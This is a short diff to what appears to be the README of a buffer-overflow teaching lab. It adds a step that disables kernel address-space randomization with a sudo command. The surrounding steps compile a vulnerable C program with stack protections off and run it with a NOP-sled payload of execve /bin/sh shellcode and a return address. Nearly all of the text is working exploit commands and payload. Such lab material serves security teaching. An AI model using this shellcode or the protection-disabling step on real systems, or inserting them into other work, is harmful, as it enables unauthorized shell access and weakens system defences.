@@ -15,7 +15,12 @@ vagrant ssh
 cd /vagrant
 gcc -m32 -ggdb -z execstack -fno-stack-protector -o vuln vuln.c
 ```
-3. Run the program with malicious payload passed in as an argument
+3. Disable stack randomization
+```bash
+echo 0|sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+4. Run the program with malicious payload passed in as an argument
 ```bash
 ./vuln $(python -c 'print "\x90" * 480 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbf\x70\xf7\xff" * 10')
 ```
